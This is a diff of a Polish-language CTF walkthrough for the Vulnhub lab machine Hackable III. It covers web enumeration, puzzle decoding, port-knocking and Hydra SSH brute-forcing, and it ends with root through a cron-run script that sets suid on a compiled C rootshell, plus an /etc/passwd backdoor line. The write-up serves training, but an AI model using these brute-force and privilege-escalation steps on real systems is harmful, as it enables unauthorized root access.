@@ -30,12 +30,13 @@ gallery4_5:
     image_path: /assets/images/hacking/2021/06/05.png
 ---
 
+|:----|:----|
 |Nazwa:|Hackable: III|
 |Autor:|[Elias-sousa](https://www.vulnhub.com/author/elias-sousa,804/)|
 |Wypuszczony:|02.06.2021|
 |Do ściągnięcia:|[Stąd](https://www.vulnhub.com/entry/hackable-iii,720) - Vulnhub|
 |Poziom:|Średni|
-|Nauczysz się:| |
+|Nauczysz się:|Metasploit, Brainfuck, Steghide, Rootshell, C|
 
 # Wstęp
 [Hackable III](https://www.vulnhub.com/entry/hackable-iii,720/)  jest najnowszą maszyną od [Eliasa Soulsa](https://www.vulnhub.com/author/elias-sousa,804/) (stan na lipiec 2021). Oznaczona jest poziomem **medium**. Nie jest tak łatwa, jak opisywane wcześniej maszynki. Jest bardzo podchwytliwa i straciłem nad nią dosyć dużo czasu, ale człowiek uczy się całe życie. **Metasploita** będę używał, ale nie jest on tutaj głównym narzędziem. Mała uwaga, na **XCP-ng** musisz nazwę interfejsu sieciowego zmienić w dwóch miejscach. Rozwiązanie podaje na końcu, gdyż to może komuś zepsuć zabawę.
@@ -51,13 +52,13 @@ host          port  proto  name  state     info
 Mamy dwa porty, 80 i 22. Jeden jest filtrowany. Zacznijmy od www. Wchodząc na stronę mamy takie coś (Kierujemy się na górny lewy róg) i mamy menu.
 {: .text-justify}
 {% include gallery id="gallery1_2"  %}
-Logowanie nic nam nie daje. W kodzie źródłowym (http://172.16.1.103/login_page/login.html) jest informacja, że to może do końca nie działać: *This page is not ready, may give error*. Bawiąc się Burpsuitem i odpalając powyższy link, Burpsuite kieruje nas do  http://172.16.1.103/login.php, a tam jest coś dziwnego, zamiast wyniku z logowania, dostajemy kod źródłowy w PHP. Z początku myślałem, że to jest ułatwienie dla pentestera i PHP nam wyświetla tę informacje, żeby ułatwić zadanie, ale nie. Niezależnie jakie parametry podasz, to jest zwykły kod w **HTML**u, tyle że ma rozszerzenie php! Na nic się zda wstrzykiwanie parametrów. Zanim do tego doszedłem minęło trochę czasu, ale to był ciekawy pomysł autora.
+Logowanie nic nam nie daje. W kodzie źródłowym (**http://172.16.1.103/login_page/login.html**) jest informacja, że to może do końca nie działać: *This page is not ready, may give error*. Bawiąc się **Burpsuite**m i odpalając powyższy link, **Burpsuite** kieruje nas do  **http://172.16.1.103/login.php**, a tam jest coś dziwnego, zamiast wyniku z logowania, dostajemy kod źródłowy w **PHP**. Z początku myślałem, że to jest ułatwienie dla pentestera i **PHP** nam wyświetla tę informacje, żeby ułatwić zadanie, ale nie. Niezależnie jakie parametry podasz, to jest zwykły kod w **HTML**, tyle że ma rozszerzenie **php**! Na nic się zda wstrzykiwanie parametrów. Zanim do tego doszedłem minęło trochę czasu, ale to był ciekawy pomysł autora.
 {: .text-justify}
 {% include gallery id="gallery3"  %}
-Sprawdźmy co jest jeszcze na na tym serwerze www:
+Sprawdźmy co jest jeszcze na na tym serwerze **WWW**:
 {: .text-justify}
 ```bash
-root@kali:/home/szikers# gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.103 -x php,txt,html,htm,png,jpg,
+# root@kali:/home/szikers# gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.103 -x php,txt,html,htm,png,jpg,
 ===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -92,44 +93,58 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 =============================================================== 
 ```
 ## Zawartość
-**http://172.16.1.103/backup/**
+<div class="notice--primary" markdown="1">
+http://172.16.1.103/backup/
+<pre>
+<p style="background-color:white;">
+wordlist.txt
+</p>
+</pre>
+</div>
+<div class="notice--primary" markdown="1">
+http://172.16.1.103/config/
+<pre>
+<p style="background-color:white;">
+1.txt
+</p>
+</pre>
+</div>
 
-wordlist.txt – pewnie hasła użytkowników
-{: .notice--info}
-**http://172.16.1.103/config/**
-
-1.txt - tekst zakodowany w Base64 **MTAwMDA=**
-{: .notice--info}
 Szybkie dekodowanie:
 ```bash
-echo MTAwMDA= | base64 -d
+# wget http://172.16.1.103/config/1.txt
+# echo MTAwMDA= | base64 -d
 10000
 ```
-**http://172.16.1.103/css/**
+<div class="notice--primary" markdown="1">
+http://172.16.1.103/css/
+<pre>
+<p style="background-color:white;">
+2.txt
+</p>
+</pre>
+</div>
 
-2.txt – tutaj mamy kod w Brainfuck. Można to odkodować poprzez stronę, albo przez program Beef.
-**++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....**
-{: .notice--info}
+W **2.txt** jest kod w Brainfuck (**++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....**) Można to odkodować poprzez stronę, albo przez program Beef.
+{: .text-justify}
 ```bash
-root@kali:/home/szikers# beef 2.txt
+# root@kali:/home/szikers# beef 2.txt
 4444
 ```
-**http://172.16.1.103/3.jpg**
-
-3.jpg - jest to plik graficzny, a w nim pewnie ukryty przekaz. Nie miałem wcześniej do czynienia z łamaniem obrazków, więc nie rozkminiłem tej zagadki, ale Elias Sousa mi podpowiedział. 
+**http://172.16.1.103/3.jpg** jest to plik graficzny, a w nim pewnie ukryty przekaz. Nie miałem wcześniej do czynienia z łamaniem obrazków, więc nie rozkminiłem tej zagadki, ale **Elias Sousa** mi podpowiedział. 
 {: .notice--info}
-Binwalk nie znalazł nic ciekawego.
+**Binwalk** nie znalazł nic ciekawego.
 ```bash
-root@kali:/home/szikers/hackable3/3# binwalk 3.jpg
+# root@kali:/home/szikers/hackable3/3# binwalk 3.jpg
 
 DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
 0             0x0             JPEG image data, JFIF standard 1.01
 
 ```
-Za to Steghide już coś pokazał:
+Za to **Steghide** już coś pokazał:
 ```bash
-root@kali:/home/szikers/hackable3/3# steghide info 3.jpg
+# root@kali:/home/szikers/hackable3/3# steghide info 3.jpg
 "3.jpg":
   format: jpeg
   capacity: 3.6 KB
@@ -157,7 +172,7 @@ Podsumowując mamy:
 Zanim znalazłem trzecią cyfrę w obrazku, użyłem metody brute-force. Jest ona powolna i robiona na siłę, ale działa.
 {: .text-justify}
 {: .notice--info}
-Spróbowałem wejść przez Ssh, ale była blokada. Jeszcze raz przejrzałem kody, przeczytałem notatkę: *Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com*  i nagle mnie olśniło. Do blokowania Ssh używa się Knockd (Trzeba zainstalować w Kali). Bez podania odpowiednich „zapukań” dostęp do Ssh będzie utrudniony. Zazwyczaj podaje się 3 parametry w przeciągu 5 sekund. Dwa pierwsze mamy. 10000 i 4444. Trzeci być może gdzieś jest w tej maszynie, szukałem w pliku 3.jpg, ale nie znalazłem (jak znajdę, zmienię ten wpis). Nie mamy trzeciego numeru, ale możemy spróbować bruteforce, chociaż to może potrwać parę dni. Jest 65536 możliwości (0-65535) na trzeci numer. Napisałem szybko skrypcik.
+Spróbowałem wejść przez **SSH**, ale była blokada. Jeszcze raz przejrzałem kody, przeczytałem notatkę: *Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com*  i nagle mnie olśniło. Do blokowania **SSH** używa się **Knockd** (Trzeba zainstalować w **Kali**). Bez podania odpowiednich „zapukań” dostęp do **SSH** będzie utrudniony. Zazwyczaj podaje się 3 parametry w przeciągu 5 sekund. Dwa pierwsze mamy. **10000** i **4444**. Trzeci być może gdzieś jest w tej maszynie, szukałem w pliku **3.jpg**, ale nie znalazłem. Nie mamy trzeciego numeru, ale możemy spróbować bruteforce, chociaż to może potrwać parę dni. Jest 65536 możliwości (0-65535) na znalezienie trzeciej liczby. Napisałem szybko skrypcik.
 {: .text-justify}
 ```bash
 #!/bin/bash
@@ -165,18 +180,17 @@ for i in {0..65535}; do
 knock -v 172.16.1.103 10000 4444 $i
 sleep 5
 done
-#--------- 
 ```
-I co? Nie działa (prawdę mówiąc nie czekałem tyle dni). Niestety to była wina maszyny i XCP-ng. Znalazłem w logach, że knockd nasłuchiwał na ensp03, zamieniłem na eth0. Po zakończeniu działania powyższego skryptu Ssh działał! Jak nie chcesz czekać na wynik, możesz od razu zastukać:
+I co? Nie działa (prawdę mówiąc nie czekałem tyle dni). Niestety to była wina maszyny i **XCP-ng**. Znalazłem w logach, że **Knockd** nasłuchiwał na **ensp03**. Niestety wszedłem sztuczką na **root**a i zamieniłem w konfigu **ensp03** na **eth0**. Po zakończeniu działania powyższego skryptu **SSH** wpuścił mnie! Jak nie chcesz czekać na wynik, możesz od razu zastukać:
 {: .text-justify}
 ```bash
-knock -v 172.16.1.103 10000 4444 65535
+# knock -v 172.16.1.103 10000 4444 65535
 ```
 ## Hydra 
 Użytkownikiem zapewne jest **jubiscleudo**, a hasło pewnie jest w **wordlist.txt**. Użyjmy Hydry:
 {: .text-justify}
 ```bash
-hydra -V -T 64 ssh://172.16.1.103 -l jubiscleudo -P wordlist.txt
+# hydra -V -T 64 ssh://172.16.1.103 -l jubiscleudo -P wordlist.txt
 
 [ATTEMPT] target 172.16.1.103 - login "jubiscleudo" - pass "maria" - 204 of 303 [child 15] (0/3)
 [ATTEMPT] target 172.16.1.103 - login "jubiscleudo" - pass "onlymy" - 205 of 303 [child 13] (0/3)
@@ -184,7 +198,7 @@ hydra -V -T 64 ssh://172.16.1.103 -l jubiscleudo -P wordlist.txt
 ...
 [22][ssh] host: 172.16.1.103   login: jubiscleudo   password: onlymy
 ```
-Jak widzimy mamy użytkownika **jubiscleudo** i hasło **onlymy**. Wejdźmy na shella.
+Jak widzimy mamy użytkownika **jubiscleudo** i hasło **onlymy**. Wejdźmy na Shella.
 {: .text-justify}
 ## Shelltris
 W katalogu **scripts** jest plik **tetris.sh**. Po uruchomieniu brakuje w nim pliku getch i program blokuje cały system. Popatrzyłem na kod źródłowy i zobaczyłem, że oryginalny nazywa się **ShellTris**. Ściągnałem cały [kod](https://shellscriptgames.com/shelltris/tarballs/shelltris-1.1.tar.gz). Skompilowałem na swoim shellu plik **getch.c**. I nic. Nie ma **root**a. Pliki mają identyczną zawartość, ale być coś może nasłuchuje i sprawdza? (Elias Souls mi wspomniał, że Shelltris to pułapka) 😏
@@ -193,8 +207,8 @@ W katalogu **scripts** jest plik **tetris.sh**. Po uruchomieniu brakuje w nim pl
 ## Zostawcie Shelltris w spokoju 
 Shelltris to pułapka, zostawcie to. Wcześniej pominąłem jedną ważną rzecz, a to mnie zablokowało na dłużej. Co prawda podpatrzyłem w [solucji](https://nepcodex.com/2021/07/hackable-iii-walkthrough-vulnhub/) tylko tą jedną rzecz, bo i tak rozwiązanie jest inne i **Eliasa Soulsa** też coś pokazał, ale zrobiłem to po swojemu. Jeszcze raz przeszedłem do katalogu **/var/www/html**
 {: .text-justify}
-```console
-jubiscleudo@ubuntu20:/var/www/html$ ls -la
+```bash
+# jubiscleudo@ubuntu20:/var/www/html$ ls -la
 total 128
 drwxr-xr-x 8 root     root      4096 Jul 30 18:30 .
 drwxr-xr-x 3 root     root      4096 Apr 29 16:13 ..
@@ -236,7 +250,7 @@ if($conexao === false){
 ?>
 ```
 ## Grupa adm
-Logując się na Shella użytkownika **hackable_3** i wypisując komendę **id** zauważyłem takie coś:
+Logując się na **Shell**a użytkownika **hackable_3** i wypisując komendę **id** zauważyłem takie coś:
 {: .text-justify}
 ```console
 hackable_3@ubuntu20:/var/www/html$ id
@@ -245,13 +259,15 @@ hackable_3@ubuntu20:/var/www/html$
 ```
 **hackable_3** jest w grupie **adm**. Poszukajmy, to może coś znajdziemy ciekawego:
 {: .text-justify}
-```console
-hackable_3@ubuntu20:/var/www/html$ grep adm /etc/group
+```bash
+# hackable_3@ubuntu20:/var/www/html$ grep adm /etc/group
+...
 adm:x:4:syslog,hackable_3
 hackable_3@ubuntu20:/var/www/html$
+...
 ```
-```console
-hackable_3@ubuntu20:/var/www/html$ find / -group adm 2>/dev/null
+```bash
+# hackable_3@ubuntu20:/var/www/html$ find / -group adm 2>/dev/null
 /var/log/cloud-init-output.log
 /var/log/dmesg.3.gz
 /var/log/auth.log.1
@@ -262,8 +278,8 @@ hackable_3@ubuntu20:/var/www/html$ find / -group adm 2>/dev/null
 /var/log/dmesg.0
 /var/log/auth.log.2.gz
 ```
-```console
-hackable_3@ubuntu20:/var/log$ cat syslog
+```bash
+# hackable_3@ubuntu20:/var/log$ cat syslog
 Aug 10 22:24:01 ubuntu20 CRON[5133]: (root) CMD (python3 /scripts/to_hackable_3.py)
 Aug 10 22:26:01 ubuntu20 CRON[5141]: (root) CMD (python3 /scripts/to_hackable_3.py)
 Aug 10 22:28:01 ubuntu20 CRON[5149]: (root) CMD (python3 /scripts/to_hackable_3.py)
@@ -275,7 +291,8 @@ Aug 10 22:38:01 ubuntu20 CRON[5193]: (root) CMD (python3 /scripts/to_hackable_3.
 Aug 10 22:40:01 ubuntu20 CRON[5201]: (root) CMD (python3 /scripts/to_hackable_3.py)
 ```
 ## Włany Rootshell
-Crontab nie może uruchomić z **Root**a programu **/scripts/to_hackable_3.py**. Akcja działa co 2 minuty. Pomóżmy mu, aby się Crontab nie męczył :smiley:, ale zanim to nastąpi skompilujmy u siebie na konsoli (niestety nie mamy tutaj **gcc**) prosty rootshell i wrzućmy go na konto. A czemu tak się bawić? Zwykłe skrypty z ustawionym bitem Suid nie przechodzą na **Root**a z innego użytkownika, więc najlepiej napisać program i go skompilować:
+**Crontab** nie może uruchomić z **Root**a programu **/scripts/to_hackable_3.py**. Akcja działa co 2 minuty. Pomóżmy mu, aby się **Crontab** nie męczył. :smiley: Ale zanim to nastąpi skompilujmy u siebie na konsoli (niestety nie mamy tutaj **gcc**) prosty **rootshell** i wrzućmy go na konto. A czemu tak się bawić? Zwykłe skrypty z ustawionym bitem Suid nie przechodzą na **Root**a z innego użytkownika, więc najlepiej napisać program i go skompilować:
+{: .text-justify}
 ```c
 void main()
 { setuid(0);
@@ -284,8 +301,9 @@ void main()
 }
 ```
 Rootshell wrzucamy do katalogu:
+{: .text-justify}
 ```bash
-cp /home/hackable_3/rootshell /scripts/
+# cp /home/hackable_3/rootshell /scripts/
 ```
 A zawartość **/scripts/to_hackable_3.py** może wyglądać tak:
 {: .text-justify}
@@ -295,8 +313,8 @@ system('chown root:root /scripts/rootshell && chmod u+s /scripts/rootshell')
 ```
 Czekamy z 2 minuty, aby Crontab odwalił za nas robotę:
 {: .text-justify}
-```console
-hackable_3@ubuntu20:/scripts$ ls -la
+```bash
+# hackable_3@ubuntu20:/scripts$ ls -la
 total 100
 drwxr-xr-x  2 hackable_3 hackable_3  4096 Aug 10 23:06 .
 drwxr-xr-x 21 root       root        4096 Apr 29 16:32 ..
@@ -307,19 +325,19 @@ drwxr-xr-x 21 root       root        4096 Apr 29 16:32 ..
 -rwxrwxr-x  1 hackable_3 hackable_3   251 Aug 10 21:59 to_hackable_3.py
 ```
 **Rootshell** ma Suida i **Root**a:
-```console
-hackable_3@ubuntu20:/scripts$ ./rootshell
+```bash
+# hackable_3@ubuntu20:/scripts$ ./rootshell
 root@ubuntu20:/scripts# id
 uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd),1000(hackable_3)
 root@ubuntu20:/scripts#
 ```
-Zamiast tworzyć rootshell, to możemy dodać użytkownika do pliku **/etc/passwd**:
+Zamiast tworzyć **rootshell**, to możemy dodać użytkownika do pliku **/etc/passwd**:
 {: .text-justify}
 ```bash
-echo 'kerszi::0:0:,,,:/root:/bin/bash' >> /etc/passwd
+# echo 'kerszi::0:0:,,,:/root:/bin/bash' >> /etc/passwd
 ```
 ## Parę słów na koniec
-Uwaga, jeżeli chcesz, żeby ta maszyna działała na XCP-ng trzeba podczas startu systemu zmienic w Grubie ro na rw init=/bin/bash, potem F10, w /etc/netplan/00-installer-config.yaml zmieniamy na interfejs eth0. Dodatkowo należy zmienić w /etc/default/knockd na KNOCKD_OPTS="-i eth0".
+Uwaga, jeżeli chcesz, żeby ta maszyna działała na **XCP-ng** trzeba podczas startu systemu zmienic w **Grub**ie **ro** na **rw init=/bin/bash**, potem **F10**. To było w **Grub**ie. W **Linux**ie zaś w **/etc/netplan/00-installer-config.yaml** zmieniamy sieciówkę na interfejs **eth0**. Dodatkowo należy zmienić w **/etc/default/knockd na KNOCKD_OPTS="-i eth0"**.
 {: .text-justify}
 {: .notice--danger}
 Jeżeli się podobała solucja, to napisz na [kerszi@protonmail.com](mailto:kerszi@protonmail.com).
